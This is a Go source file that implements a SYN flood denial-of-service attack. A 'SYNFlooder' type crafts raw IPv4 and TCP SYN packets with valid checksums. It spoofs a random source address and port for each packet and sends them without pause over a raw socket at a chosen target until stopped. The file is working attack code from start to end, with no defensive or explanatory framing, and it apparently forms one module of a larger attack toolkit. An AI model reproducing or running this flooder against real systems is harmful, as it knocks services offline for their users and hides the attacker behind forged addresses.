package vectors

import (
	"encoding/binary"
	"math/rand"
	"net"
	"sync/atomic"
	"time"

	"golang.org/x/sys/unix"
)

type SYNFlooder struct {
	dstIP   net.IP
	dstPort uint16
	sent    atomic.Uint64
}

func NewSYNFlooder(dst string, port uint16) (*SYNFlooder, error) {
	ip := net.ParseIP(dst).To4()
	if ip == nil {
		return nil, unix.EINVAL
	}
	return &SYNFlooder{dstIP: ip, dstPort: port}, nil
}

func tcpChecksum(src, dst net.IP, tcp []byte) uint16 {
	var sum uint32
	pseudo := make([]byte, 12)
	copy(pseudo[0:4], src.To4())
	copy(pseudo[4:8], dst.To4())
	pseudo[9] = 6
	binary.BigEndian.PutUint16(pseudo[10:12], uint16(len(tcp)))
	for i := 0; i < len(pseudo); i += 2 {
		sum += uint32(binary.BigEndian.Uint16(pseudo[i : i+2]))
	}
	for i := 0; i < len(tcp); i += 2 {
		sum += uint32(binary.BigEndian.Uint16(tcp[i : i+2]))
	}
	for sum>>16 != 0 {
		sum = (sum & 0xffff) + (sum >> 16)
	}
	return ^uint16(sum)
}

func (s *SYNFlooder) craftPacket(srcIP net.IP, srcPort uint16, rng *rand.Rand) []byte {
	ip := make([]byte, 20)
	ip[0] = 0x45
	binary.BigEndian.PutUint16(ip[2:4], 40)
	binary.BigEndian.PutUint16(ip[4:6], uint16(rng.Intn(65535)))
	ip[8] = 64
	ip[9] = 6
	copy(ip[12:16], srcIP.To4())
	copy(ip[16:20], s.dstIP.To4())
	var sum uint32
	for i := 0; i < 20; i += 2 {
		sum += uint32(binary.BigEndian.Uint16(ip[i : i+2]))
	}
	for sum>>16 != 0 {
		sum = (sum & 0xffff) + (sum >> 16)
	}
	binary.BigEndian.PutUint16(ip[10:12], ^uint16(sum))

	tcp := make([]byte, 20)
	binary.BigEndian.PutUint16(tcp[0:2], srcPort)
	binary.BigEndian.PutUint16(tcp[2:4], s.dstPort)
	binary.BigEndian.PutUint32(tcp[4:8], rng.Uint32())
	tcp[12] = 0x50
	tcp[13] = 0x02
	binary.BigEndian.PutUint16(tcp[14:16], 64240)
	binary.BigEndian.PutUint16(tcp[16:18], tcpChecksum(srcIP, s.dstIP, tcp))

	return append(ip, tcp...)
}

func (s *SYNFlooder) Run(stop <-chan struct{}) error {
	fd, err := unix.Socket(unix.AF_INET, unix.SOCK_RAW, unix.IPPROTO_RAW)
	if err != nil {
		return err
	}
	defer unix.Close(fd)
	unix.SetsockoptInt(fd, unix.IPPROTO_IP, unix.IP_HDRINCL, 1)

	dst := &unix.SockaddrInet4{Port: int(s.dstPort)}
	copy(dst.Addr[:], s.dstIP.To4())

	rng := rand.New(rand.NewSource(time.Now().UnixNano()))

	for {
		select {
		case <-stop:
			return nil
		default:
		}
		src := net.IPv4(byte(rng.Intn(223)+1), byte(rng.Intn(256)),
			byte(rng.Intn(256)), byte(rng.Intn(254)+1))
		sport := uint16(rng.Intn(65535) + 1)
		pkt := s.craftPacket(src, sport, rng)
		_ = unix.Sendto(fd, pkt, 0, dst)
		s.sent.Add(1)
	}
}

func (s *SYNFlooder) Sent() uint64 { return s.sent.Load() }
